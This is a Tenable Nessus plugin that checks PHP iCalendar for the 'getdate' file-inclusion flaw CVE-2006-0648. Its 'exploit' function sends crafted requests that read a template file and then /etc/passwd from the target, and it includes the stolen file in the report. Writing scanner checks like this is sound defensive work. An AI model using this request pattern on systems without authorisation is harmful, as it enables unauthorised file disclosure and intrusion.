#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is susceptible
to remote file inclusion attacks. 

Description :

The remote host appears to be running PHP iCalendar, a web-based iCal
file viewer / parser written in PHP. 

The installed version of PHP iCalendar fails to validate user input to
the 'getdate' parameter of the 'search.php' script as well as the
'file' parameter of 'template.php' script.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker can
leverage these flaws to view arbitrary files on the remote host and
execute arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://evuln.com/vulns/70/summary.html
http://dimer.tamu.edu/phpicalendar.net/forums/viewtopic.php?p=1869#1869

Solution :

Disable PHP's 'register_globals' setting or modify the code as
described in the advisory above. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";


if (description) {
  script_id(20867);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-0648");
  script_bugtraq_id(16557);

  script_name(english:"PHP iCalendar getdate Parameter Remote File Include Vulnerability");
  script_summary(english:"Checks for getdate parameter remote file include vulnerability in PHP iCalendar");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# A function to actually read a file.
function exploit(dir, file) {
  local_var req, res;
  global_var port;

  req = http_get(
    item:string(
      dir, "/search.php?",
      "getdate=", file
    ), 
    port:port
  );
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Referer: ", SCRIPT_NAME, "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  return res;
}


# Loop through directories.
if (thorough_tests) dirs = make_list("/icalendar", "/phpicalendar", "/calendar", "/ical", "/cal", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = exploit(dir:dir, file:"./templates/default/admin.tpl");
  if (res == NULL) exit(0);

  # There's a problem if it looks like the admin template.
  if (egrep(pattern:"\{(HEADER|L_LOGOUT|L_ADMIN_HEADER)\}", string:res)) {
    # Try to exploit it to read /etc/passwd for the report.
    res2 = exploit(dir:dir, file:"/etc/passwd");
    if (res2) {
      contents = strstr(res2, "getdate=");
      if (contents) contents = contents - strstr(contents, '"><img src="templates/default/images/day_on.gif');
      if (contents) contents = contents - "getdate=";
    }

    if (isnull(contents)) report = desc;
    else {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here is the /etc/passwd file that Nessus read from the remote host :\n",
        "\n",
        contents
      );
    }

    security_note(port:port, data:report);
    exit(0);
  }
}
